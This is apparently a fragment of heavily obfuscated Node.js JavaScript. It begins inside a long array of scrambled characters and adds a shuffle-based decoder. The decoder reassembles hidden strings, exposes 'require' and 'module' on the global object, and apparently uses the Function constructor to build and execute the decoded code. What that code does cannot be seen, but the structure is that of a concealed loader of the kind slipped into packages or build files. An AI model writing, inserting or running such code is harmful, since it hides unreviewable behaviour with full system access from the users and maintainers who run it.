<1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
